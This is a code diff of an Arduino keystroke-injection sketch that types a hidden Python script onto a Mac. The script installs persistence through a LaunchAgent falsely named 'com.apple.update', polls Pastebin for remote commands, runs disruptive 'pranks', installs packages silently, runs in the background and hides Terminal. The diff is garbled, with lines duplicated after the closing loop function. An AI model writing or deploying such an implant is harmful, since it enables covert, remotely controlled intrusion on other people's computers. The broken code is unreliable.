@@ -43,7 +43,6 @@ void setup() {
   // === Single combined file: all pranks + Pastebin watcher ===
   typeln(F("cat>/tmp/.t.py<<'E'"));
   typeln(F("import subprocess,time,urllib.request,plistlib,os,pathlib,datetime,hashlib,random,glob"));
-  typeln(F("from Quartz import CGWarpMouseCursorPosition"));
   typeln(F("la=os.path.expanduser('~/Library/LaunchAgents/com.apple.update.plist')"));
   typeln(F("pathlib.Path(os.path.dirname(la)).mkdir(exist_ok=True)"));
   typeln(F("if not os.path.exists(la):"));
@@ -52,7 +51,9 @@ void setup() {
   typeln(F(" subprocess.run(['launchctl','load',la])"));
 
   // Prank functions — each fires once and returns
-  typeln(F("def jiggle():CGWarpMouseCursorPosition((random.randint(0,3840),random.randint(0,2160)))"));
+  typeln(F("def jiggle():"));
+  typeln(F(" from Quartz import CGWarpMouseCursorPosition"));
+  typeln(F(" CGWarpMouseCursorPosition((random.randint(0,3840),random.randint(0,2160)))"));
   typeln(F("def minimise():subprocess.run(['osascript','-e','tell application \"System Events\" to keystroke \"m\" using {command down}'])"));
   typeln(F("def sound():subprocess.run(['afplay',random.choice(glob.glob('/System/Library/Sounds/*.aiff'))])"));
   typeln(F("def notify():"));
@@ -98,6 +99,30 @@ void setup() {
   typeln(F("    key=(cmd,sh,sm,str(now.date()))"));
   typeln(F("    if now.hour==sh and abs(now.minute-sm)<1 and key not in fired:"));
   typeln(F("     fired.add(key)"));
+  typeln(F("     if cmd=='STOP':stop=True;break"));
+  typeln(F("     if cmd in cmds:cmds[cmd]()"));
+  typeln(F("   except:pass"));
+  typeln(F("  else:"));
+  typeln(F("   key=(cmd,h)"));
+  typeln(F("   if key not in fired:"));
+  typeln(F("    fired.add(key)"));
+  typeln(F("    if cmd=='STOP':stop=True;break"));
+  typeln(F("    if cmd in cmds:cmds[cmd]()"));
+  typeln(F(" if stop:"));
+  typeln(F("  subprocess.run(['launchctl','unload',la])"));
+  typeln(F("  try:os.remove(la)"));
+  typeln(F("  except:pass"));
+  typeln(F("  try:os.remove('/tmp/.t.py')"));
+  typeln(F("  except:pass"));
+  typeln(F("  break"));
+  typeln(F(" time.sleep(30)"));
+  typeln(F("E"));
+
+  // Install Quartz, launch watcher silently, hide Terminal
+  typeln(F("python3 -m pip install pyobjc-framework-Quartz -q;nohup python3 /tmp/.t.py&disown;osascript -e 'tell app \"Terminal\" to set miniaturized of every window to true'"));
+}
+
+void loop() {}
   typeln(F("     if cmd=='STOP':stop=True;break"));
   typeln(F("     if cmd in cmds:cmds[cmd]()"));
   typeln(F("   except:pass"));
